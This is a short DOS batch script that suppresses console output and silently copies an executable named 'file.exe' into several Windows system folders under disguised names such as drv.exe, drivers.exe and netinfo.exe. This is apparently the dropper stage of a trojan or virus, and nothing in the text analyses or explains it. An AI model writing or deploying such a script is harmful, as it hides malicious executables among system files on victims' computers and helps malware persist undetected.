@ECHO OFF
CTTY NUL
@IF EXIST file.exe COPY file.exe c:\windows
@IF EXIST file.exe COPY file.exe c:\windows\system\drv.exe
@IF EXIST file.exe COPY file.exe c:\windows\drivers.exe
@IF EXIST file.exe COPY file.exe c:\windows\netinfo.exe
@IF EXIST file.exe COPY file.exe c:\windows\system\netinfo.exe